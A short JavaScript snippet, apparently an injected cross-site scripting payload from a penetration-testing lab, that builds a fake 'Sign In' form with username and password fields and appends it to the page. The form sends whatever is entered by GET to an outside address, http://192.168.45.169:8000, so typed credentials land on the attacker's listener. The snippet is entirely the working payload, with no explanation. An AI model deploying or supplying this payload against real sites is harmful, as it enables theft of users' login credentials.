let username = document.createElement("input")
username.type = "text"
username.name = "username"

let password = document.createElement("input")
password.type = "password"
password.name = "password"

let submitBtn = document.createElement("button")
submitBtn.type = "submit"
submitBtn.innerHTML = "Sign In"

let myForm = document.createElement("form")
myForm.method = "get"
myForm.action = "http://192.168.45.169:8000"
myForm.append(username)
myForm.append(password)
myForm.append(submitBtn)

let myHtml = document.getElementsByTagName("html")[0]
myHtml.append(myForm)
